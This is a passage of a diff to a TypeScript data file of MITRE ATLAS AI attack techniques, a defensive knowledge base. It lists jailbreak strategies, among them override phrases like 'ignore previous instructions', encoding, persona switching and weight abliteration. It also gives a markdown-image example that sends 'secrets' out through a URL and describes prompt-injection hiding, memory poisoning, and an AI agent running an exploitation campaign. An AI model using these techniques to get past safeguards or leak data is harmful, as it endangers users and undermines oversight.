switching: Instruct the LLM to adopt an identity or mode that allows unrestricted answers (e.g. \"as a security researcher\").\n- Fictionalization and hypotheticals: Instruct the LLM to include disallowed content as part of a story, screenplay, or educational scenario.\n- Separate intent from content: request analysis, examples, templates, or edge cases, that implicitly contain disallowed content.\n- Multi-turn escalation / Crescendo: Utilize a sequence of prompts that start benign, establish trust, then gradually cross policy boundaries with incremental prompts.\n- Constrained output formats: Instruct the LLM to output to a strict schema or format (e.g. JSON, YAML, code, or tables).\n- Obfuscation and transformation: Use encoding, transformations, translation, or euphemisms, (e.g., base64 encoding, \"describe it in another language\").\n- Create a high priority objective: Frame compliance as necessary to fulfill the user's main task (e.g. \"to complete the evaluation,\" \"to follow the spec,\" \"to follow safety guidelines\").\n- Affirmation: Appending affirmations such as \"sure\" to the end of prompts can help bypass refusals to generate malicious or otherwise undesired content.[[cybernews]]\n\nAdversaries may also use algorithmic approaches to generating jailbreak prompts [[jailbreak-zoo]] [[jailbreak-survey]]. Algorithmic jailbreak generation allows for automated methods that discover jailbreaks at scale. Some approaches automate manual strategies [[autodan]] [[gptfuzzer]] [[crescendo]] [[echo-chamber]] while others optimize a string of tokens directly [[universal]] to produce nonsensical text. Both black-box (applicable to commercial models where the adversary has only query access to the model) and white-box (applicable in the open-source setting, where the adversary has full access to the model weights) optimization approaches are viable.\n\nAdversaries may also directly manipulate a model's weights, or modify or remove parts of a model to create a jailbroken or \"uncensored\" variant of the target model. This is applicable to open-source models, or cases where the adversary gains full access to the target model. Approaches include fine-tuning to reduce refusals [[single-direction]], targeted model editing [[rome]], addition of adapters [[lora]], and removing safety mechanisms such as guardrails.\n\nJailbreak prompts that are known to work on various classes of LLMs are often published in the open-source community [[dan]]. Jailbroken or uncensored LLMs that have been trained or fine-tuned to be jailbroken are shared in public model registries such as huggingface [[abliteration]].",
+    "description": "Adversaries may induce a large language model (LLM) to ignore, circumvent, or override its safety/alignment behaviors and/or guardrails to elicit outputs the model is intended to withhold. Once jailbroken, the LLM may be used in unintended ways by the adversary. Jailbreaks may be achieved via adversarial prompting, or by modifying model weights or safety mechanisms.\n\nAdversaries may attempt a jailbreak for [Defense Evasion](/tactics/AML.TA0007) of the LLM's guidelines and guardrails itself to then reveal information (ex: [LLM Data Leakage](/techniques/AML.T0057), [Discover LLM System Information](/techniques/AML.T0069)) or generate harmful content (ex: [Generate Malicious Commands](/techniques/AML.T0102), [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)). They may also jailbreak a model for [Privilege Escalation](/tactics/AML.TA0012) to invoke tools or perform actions for their own purposes (ex: [AI Agent Tool Invocation](/techniques/AML.T0053)) or abuse the agent for a [Command and Control](/tactics/AML.TA0014) channel (ex: [AI Agent](/techniques/AML.T0108)).\n\nAdversaries use a variety of strategies to craft jailbreak prompts. Prompts may target specific models or model families and are iterated upon until successful. Model providers actively update their model guardrails to make them more resistant to jailbreak prompts as new prompts are developed. Common strategies [[jailbreak-guide]] include but are not limited to:\n\n- Instruction override: Use phrasing that attempts to supersede prior constraints (e.g. \"ignore previous instructions\").\n- Roleplay / persona switching: Instruct the LLM to adopt an identity or mode that allows unrestricted answers (e.g. \"as a security researcher\").\n- Fictionalization and hypotheticals: Instruct the LLM to include disallowed content as part of a story, screenplay, or educational scenario.\n- Separate intent from content: request analysis, examples, templates, or edge cases, that implicitly contain disallowed content.\n- Multi-turn escalation / Crescendo: Utilize a sequence of prompts that start benign, establish trust, then gradually cross policy boundaries with incremental prompts.\n- Constrained output formats: Instruct the LLM to output to a strict schema or format (e.g. JSON, YAML, code, or tables).\n- Data structure injection: Use structured prompts (e.g. YAML, JSON, XML, etc.) to steer the LLM to produce structured outputs such as tool schemas or workflow fragments. This can be used by the adversary to call tools, pass dangerous inputs into legitimate tools, or hijack workflows.[[zenity-dsi]]\n- Obfuscation and transformation: Use encoding, transformations, translation, or euphemisms, (e.g., base64 encoding, \"describe it in another language\").\n- Create a high priority objective: Frame compliance as necessary to fulfill the user's main task (e.g. \"to complete the evaluation,\" \"to follow the spec,\" \"to follow safety guidelines\").\n- Affirmation: Appending affirmations such as \"sure\" to the end of prompts can help bypass refusals to generate malicious or otherwise undesired content.[[cybernews]]\n\nAdversaries may also use algorithmic approaches to generating jailbreak prompts [[jailbreak-zoo]] [[jailbreak-survey]]. Algorithmic jailbreak generation allows for automated methods that discover jailbreaks at scale. Some approaches automate manual strategies [[autodan]] [[gptfuzzer]] [[crescendo]] [[echo-chamber]] while others optimize a string of tokens directly [[universal]] to produce nonsensical text. Both black-box (applicable to commercial models where the adversary has only query access to the model) and white-box (applicable in the open-source setting, where the adversary has full access to the model weights) optimization approaches are viable.\n\nAdversaries may also directly manipulate a model's weights, or modify or remove parts of a model to create a jailbroken or \"uncensored\" variant of the target model. This is applicable to open-source models, or cases where the adversary gains full access to the target model. Approaches include fine-tuning to reduce refusals [[single-direction]], targeted model editing [[rome]], addition of adapters [[lora]], and removing safety mechanisms such as guardrails.\n\nJailbreak prompts that are known to work on various classes of LLMs are often published in the open-source community [[dan]]. Jailbroken or uncensored LLMs that have been trained or fine-tuned to be jailbroken are shared in public model registries such as huggingface [[abliteration]].",
     "tacticId": "AML.TA0007",
     "tacticName": "Defense Evasion",
     "tactics": [
@@ -31296,7 +32152,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
     ],
     "maturity": "Realized",
     "createdDate": "2023-10-25",
-    "modifiedDate": "2026-05-27",
+    "modifiedDate": "2026-09-15",
     "mitigations": [
       {
         "id": "AML.M0020",
@@ -31532,6 +32388,12 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "GitHub Copilot Jailbreak Vulnerability Let Attackers Train Malicious Models",
         "url": "https://cybersecuritynews.com/github-copilot-jailbreak-vulnerability",
         "externalId": "cybernews"
+      },
+      {
+        "sourceName": "Data-Structure Injection (DSI) in AI Agents",
+        "description": "Data-Structure Injection (DSI) in AI Agents",
+        "url": "https://labs.zenity.io/p/data-structure-injection-dsi-in-ai-agents",
+        "externalId": "zenity-dsi"
       }
     ]
   },
@@ -32781,7 +33643,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
   {
     "id": "AML.T0068",
     "name": "LLM Prompt Obfuscation",
-    "description": "Adversaries may hide or otherwise obfuscate prompt injections or retrieval content to avoid detection from humans, large language model (LLM) guardrails, or other detection mechanisms.\n\nFor text inputs, this may include modifying how the instructions are rendered such as small text, text colored the same as the background, or hidden HTML elements. For multi-modal inputs, malicious instructions could be hidden in the data itself (e.g. in the pixels of an image) or in file metadata (e.g. EXIF for images, ID3 tags for audio, or document metadata).\n\nInputs can also be obscured via an encoding scheme such as base64 or rot13. This may bypass LLM guardrails that identify malicious content and may not be as easily identifiable as malicious to a human in the loop.",
+    "description": "Adversaries may hide or otherwise obfuscate prompt injections or retrieval content to avoid detection from humans, large language model (LLM) guardrails, or other detection mechanisms.\n\nText inputs may be obfuscated by modifying how the instructions are rendered, such as small font, text colored the same as the background, or hidden HTML elements. Similarly, approaches for other modalities include low-contrast or tiny text placed inside an image, text overlaid on a busy or camouflaging background, instructions spoken faintly or sped up in audio, or text shown briefly in a single video frame.\n\nInputs can also be obscured via an encoding scheme such as base64 or rot13. This may bypass LLM guardrails that identify malicious content and may not be as easily identifiable as malicious to a human in the loop.",
     "tacticId": "AML.TA0007",
     "tacticName": "Defense Evasion",
     "tactics": [
@@ -32796,9 +33658,9 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
       "Generative AI",
       "Agentic AI"
     ],
-    "maturity": "Demonstrated",
+    "maturity": "Realized",
     "createdDate": "2025-03-12",
-    "modifiedDate": "2026-05-27",
+    "modifiedDate": "2026-09-15",
     "mitigations": [
       {
         "id": "AML.M0020",
@@ -32860,6 +33722,11 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "id": "AML.CS0066",
         "name": "ZombieAgent: Data Exfiltration Attack on ChatGPT",
         "url": "https://atlas.mitre.org/studies/AML.CS0066"
+      },
+      {
+        "id": "AML.CS0072",
+        "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072"
       }
     ],
     "procedureExamples": [
@@ -32941,6 +33808,14 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "The prompt injection was visually concealed in externally controlled content using techniques such as white-on-white text or microscopic font sizes. ChatGPT could process the instructions even though they were not apparent to the user.",
         "url": "https://atlas.mitre.org/studies/AML.CS0066",
         "stepId": "S02",
+        "tacticId": "AML.TA0007"
+      },
+      {
+        "caseStudyId": "AML.CS0072",
+        "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "description": "The instruction was concealed from the user behind a benign interface label, with the prompt text visible only in the URL. Bundling it with a genuine summarization request made the resulting assistant behavior appear expected.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072",
+        "stepId": "S03",
         "tacticId": "AML.TA0007"
       }
     ],
@@ -33797,7 +34672,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
   {
     "id": "AML.T0077",
     "name": "LLM Response Rendering",
-    "description": "An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server. \n\nThe adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown\n\nFor example, an LLM may produce the following markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"private data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",
+    "description": "Adversaries may induce a large language model (LLM) to respond with private information structured in a reference to external content that, when rendered by the user's client, makes a request to an adversary-controlled server, exfiltrating the data. The private information can be hidden from the user and the external content can still render properly in the user's client, thus not raising the suspicion of the user.\n\nRendered content can include images, embedded webpages, or link previews and may use HTML, Markdown, or other rendering mechanisms. The private information can be hidden in parts of the URL pointing to an adversary-controlled server, including query parameters or URL path segments, and may be split across multiple requests. Markdown or HTML image tags may automatically render directly in the user's AI chat client. Integrations into applications such as Slack or Microsoft Teams may render external content automatically without requiring the user to take any action.\n\n\nAs an example, the adversary may manipulate the LLM to produce the following markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"private data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",
     "tacticId": "AML.TA0010",
     "tacticName": "Exfiltration",
     "tactics": [
@@ -33814,7 +34689,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
     ],
     "maturity": "Demonstrated",
     "createdDate": "2025-04-15",
-    "modifiedDate": "2026-05-27",
+    "modifiedDate": "2026-09-15",
     "mitigations": [],
     "caseStudies": [
       {
@@ -34049,6 +34924,11 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "id": "AML.CS0066",
         "name": "ZombieAgent: Data Exfiltration Attack on ChatGPT",
         "url": "https://atlas.mitre.org/studies/AML.CS0066"
+      },
+      {
+        "id": "AML.CS0072",
+        "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072"
       }
     ],
     "procedureExamples": [
@@ -34139,6 +35019,14 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "url": "https://atlas.mitre.org/studies/AML.CS0066",
         "stepId": "S01",
         "tacticId": "AML.TA0003"
+      },
+      {
+        "caseStudyId": "AML.CS0072",
+        "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "description": "Operators embedded the crafted link into their own web properties as a \"Summarize with AI\" button or share widget. In some cases, the same links were distributed through email.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072",
+        "stepId": "S01",
+        "tacticId": "AML.TA0003"
       }
     ],
     "references": []
@@ -34175,7 +35063,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
       "Generative AI",
       "Agentic AI"
     ],
-    "maturity": "Demonstrated",
+    "maturity": "Realized",
     "createdDate": "2025-09-30",
     "modifiedDate": "2026-05-27",
     "mitigations": [
@@ -34218,7 +35106,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
       "Generative AI",
       "Agentic AI"
     ],
-    "maturity": "Demonstrated",
+    "maturity": "Realized",
     "createdDate": "2025-09-30",
     "modifiedDate": "2026-05-27",
     "mitigations": [
@@ -34252,6 +35140,11 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "id": "AML.CS0066",
         "name": "ZombieAgent: Data Exfiltration Attack on ChatGPT",
         "url": "https://atlas.mitre.org/studies/AML.CS0066"
+      },
+      {
+        "id": "AML.CS0072",
+        "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072"
       }
     ],
     "procedureExamples": [
@@ -34277,6 +35170,14 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "The malicious instructions caused ChatGPT to create or modify memories. The poisoned memories instructed ChatGPT to retain sensitive information from conversations and to perform attacker-defined actions during later interactions.",
         "url": "https://atlas.mitre.org/studies/AML.CS0066",
         "stepId": "S05",
+        "tacticId": "AML.TA0006"
+      },
+      {
+        "caseStudyId": "AML.CS0072",
+        "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "description": "The persistence clause caused the assistant to write a durable memory entry designating the operator's domain, product, or marketing copy as an authoritative source. The entry survived beyond its originating session.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072",
+        "stepId": "S04",
         "tacticId": "AML.TA0006"
       }
     ],
@@ -34599,6 +35500,13 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "Limit the public release of technical information about the AI stack used in an organization's products or services. Technical knowledge of how AI is used can be leveraged by adversaries to perform targeting and tailor attacks to the target system. Additionally, consider limiting the release of organizational information - including physical locations, researcher names, and department structures - from which technical details such as AI techniques, model architectures, or datasets may be inferred.",
         "useDescription": "Limit public disclosure of agent tools, services, configuration, and workflows.",
         "url": "https://atlas.mitre.org/mitigations/AML.M0000"
+      },
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Honeypots can surface which agent configuration and related assets adversaries hunt for, exposing the reconnaissance that precedes agent-targeted attacks, and acting as both canary tokens and decoy.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
       }
     ],
     "caseStudies": [
@@ -35544,10 +36452,6 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
       "Enterprise"
     ],
     "maturity": "Realized",
-    "attackReference": {
-      "id": "T1057",
-      "url": "https://attack.mitre.org/techniques/T1057/"
-    },
     "createdDate": "2025-10-27",
     "modifiedDate": "2026-08-31",
     "mitigations": [],
@@ -35907,7 +36811,15 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
     "maturity": "Demonstrated",
     "createdDate": "2025-10-29",
     "modifiedDate": "2026-05-27",
-    "mitigations": [],
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Since honeypots capture real input, they can provide visibility into attacks and prompt payloads that are target-specific.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
     "caseStudies": [
       {
         "id": "AML.CS0016",
@@ -36148,7 +37060,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
   {
     "id": "AML.T0095",
     "name": "Search Open Websites/Domains",
-    "description": "Adversaries may search public websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or domains owned by the victim.\n\nAdversaries may find the information they seek to gather via search engines. They can use precise search queries to identify software platforms or services used by the victim to use in targeting. This may be followed by [Exploit Public-Facing Application](/techniques/AML.T0049) or [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093).",
+    "description": "Adversaries may search public websites and/or domains for information about victims and AI targets that can be used during targeting and to discover opportunities for successful attacks. Information about a victim's attack surface may be available in various online sites, such as social media, news sites, or domains owned by the victim.\n\nAdversaries may find the information they seek to gather via search engines. They can use precise search queries to identify software platforms or services used by the victim to use in targeting. This may be followed by [Exploit Public-Facing Application](/techniques/AML.T0049) or [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093).\n\nAdversaries may utilize OSINT-based discovery to map different AI assets by using search engine result pages, as well as backlink analysis, to locate agentic interfaces (which are frequently embedded via iFrames and follow predictable naming conventions). By analyzing the indexed URL structures of these sources from different search engines, attackers can often reverse-engineer internal environment IDs and organization-specific naming conventions. This intelligence gathering significantly narrows the search space for any later targeted fuzzing or enumeration performed by [Active Scanning: Enumerate Hosted AI Resources](/techniques/AML.T0006.000).",
     "tacticId": "AML.TA0002",
     "tacticName": "Reconnaissance",
     "tactics": [
@@ -36176,7 +37088,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
       "url": "https://attack.mitre.org/techniques/T1593/"
     },
     "createdDate": "2025-11-05",
-    "modifiedDate": "2026-05-27",
+    "modifiedDate": "2026-09-15",
     "mitigations": [
       {
         "id": "AML.M0000",
@@ -36184,6 +37096,13 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "Limit the public release of technical information about the AI stack used in an organization's products or services. Technical knowledge of how AI is used can be leveraged by adversaries to perform targeting and tailor attacks to the target system. Additionally, consider limiting the release of organizational information - including physical locations, researcher names, and department structures - from which technical details such as AI techniques, model architectures, or datasets may be inferred.",
         "useDescription": "Limit public technical and organizational information that reveals the AI stack, services, personnel, or other targeting details on websites and domains.",
         "url": "https://atlas.mitre.org/mitigations/AML.M0000"
+      },
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Decoy assets, such as honeypots, can act as a first contact for adversarial activity and reveal discovery channels that attackers are using to find web AI assets for targeting.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
       }
     ],
     "caseStudies": [
@@ -36257,7 +37176,15 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
     },
     "createdDate": "2026-04-22",
     "modifiedDate": "2026-05-27",
-    "mitigations": [],
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Decoy assets, such as honeypots, can act as a first contact for adversarial activity and reveal discovery channels that attackers are using to find web AI assets for targeting.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
     "caseStudies": [
       {
         "id": "AML.CS0051",
@@ -36297,7 +37224,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek searched GitHub for trending 2026 CVE PoC repositories sorted by stars.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S14",
+        "stepId": "S13",
         "tacticId": "AML.TA0002"
       }
     ],
@@ -36521,7 +37448,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
   {
     "id": "AML.T0100",
     "name": "AI Agent Clickbait",
-    "description": "Adversaries may craft deceptive web content designed to bait Computer-Using AI agents or AI web browsers into taking unintended actions, such as clicking buttons, copying code, or navigating to specific web pages. These attacks exploit the agent's interpretation of UI content, visual cues, or prompt-like language embedded in the site. When successful, they can lead the agent to inadvertently copy and execute malicious code on the user's operating system.",
+    "description": "Adversaries may craft deceptive content designed to bait computer-using AI agents or AI web browsers and tools into taking unintended actions, such as clicking buttons, copying code, or navigating to specific web pages. These attacks exploit the agent's interpretation of UI content, visual cues, and natural language embedded in processed artifacts, such as a website or a document, and aim at the agent's decision process rather than a human reader's. \n\nWhen successful, AI Agent Clickbait can lead the victim's agent to inadvertently copy and execute malicious code on the user's operating system or perform data exfiltration. The AI Agent Clickbait may also include a [Prompt Injection: Indirect](/techniques/AML.T0051.001), which can influence or manipulate the victim's agent in adversary-controlled ways.",
     "tacticId": "AML.TA0005",
     "tacticName": "Execution",
     "tactics": [
@@ -36537,7 +37464,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
     ],
     "maturity": "Demonstrated",
     "createdDate": "2025-11-25",
-    "modifiedDate": "2026-05-27",
+    "modifiedDate": "2026-09-15",
     "mitigations": [
       {
         "id": "AML.M0020",
@@ -36757,7 +37684,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek generated FOFA queries, shell commands, scanner invocations, and direct HTTP probes based on the results returned during the session.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S07",
+        "stepId": "S06",
         "tacticId": "AML.TA0001"
       }
     ],
@@ -38016,7 +38943,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek investigated Langflow, determined what information and prerequisites were needed, and selected follow-on reconnaissance based on returned results.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S08",
+        "stepId": "S07",
         "tacticId": "AML.TA0002"
       },
       {
@@ -38024,7 +38951,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek assessed Langflow as low value, surveyed exposure across 10 product families, compared vulnerability severity, deployment footprint, PoC availability, and prerequisites, and selected n8n.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S13",
+        "stepId": "S12",
         "tacticId": "AML.TA0002"
       },
       {
@@ -38121,7 +39048,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "After receiving an initial task, DeepSeek sequenced reconnaissance and exploitation actions, evaluated failed prerequisites, abandoned Langflow, compared alternative products and vulnerabilities, and selected n8n. Unit 42 recovered no additional operator input during the session.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S06",
+        "stepId": "S05",
         "tacticId": "AML.TA0001"
       },
       {
@@ -38504,7 +39431,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
   {
     "id": "AML.T0124",
     "name": "Autonomous Attack Orchestration",
-    "description": "Adversaries may use autonomous AI systems as an operational control layer to manage multiple distinct autonomous agents or sub-agents toward a common adversary-defined objective. The orchestrating system may create assignments, select executors, allocate tools or resources, establish dependencies, schedule or synchronize activities, and track progress without a human directing each assignment.\n\nThe autonomous system exhibits centralized control over distributed execution including which agent performs which work, when it performs it, and how its output affects other assigned work. The system may aggregate findings and status from participating agents, request independent validation, reconcile conflicting results, prevent or resolve duplicated effort, and determine when an output satisfies a prerequisite for another activity. It may reassign stalled work, increase or reduce resources allocated to a branch, terminate low-value work, or initiate additional research or testing.\n\nOrchestration may use direct agent interfaces (See [Autonomous AI Agent Communication: Direct Agent Communication](/techniques/AMl.T0118.001)) to transmit assignments, status, and results.\n\nHuman involvement does not preclude autonomous attack orchestration. A human operator may define campaign objectives, select targets, provide infrastructure, establish constraints, or retain approval over consequential transitions.\n\n[Autonomous Attack-Path Adaptation](/techniques/AML.T0117) and [Autonomous Attack Orchestration](/techniques/AML.T0124) may occur together but describe different control functions. Attack-path adaptation captures how evidence changes the selected path. Attack orchestration captures how work is allocated, coordinated, validated, and redirected across agents.",
+    "description": "Adversaries may use autonomous AI systems as an operational control layer to manage multiple distinct autonomous agents or sub-agents toward a common adversary-defined objective. The orchestrating system may create assignments, select executors, allocate tools or resources, establish dependencies, schedule or synchronize activities, and track progress without a human directing each assignment.\n\nThe autonomous system exhibits centralized control over distributed execution including which agent performs which work, when it performs it, and how its output affects other assigned work. The system may aggregate findings and status from participating agents, request independent validation, reconcile conflicting results, prevent or resolve duplicated effort, and determine when an output satisfies a prerequisite for another activity. It may reassign stalled work, increase or reduce resources allocated to a branch, terminate low-value work, or initiate additional research or testing.\n\nOrchestration may use direct agent interfaces (See [Autonomous AI Agent Communication: Direct Agent Communication](/techniques/AML.T0118.001)) to transmit assignments, status, and results.\n\nHuman involvement does not preclude autonomous attack orchestration. A human operator may define campaign objectives, select targets, provide infrastructure, establish constraints, or retain approval over consequential transitions.\n\n[Autonomous Attack-Path Adaptation](/techniques/AML.T0117) and [Autonomous Attack Orchestration](/techniques/AML.T0124) may occur together but describe different control functions. Attack-path adaptation captures how evidence changes the selected path. Attack orchestration captures how work is allocated, coordinated, validated, and redirected across agents.",
     "tacticId": "AML.TA0001",
     "tacticName": "AI Attack Adaptation",
     "tactics": [
@@ -38746,6 +39673,229 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "tacticId": "AML.TA0003"
       }
     ],
+    "references": []
+  },
+  {
+    "id": "AML.T0129",
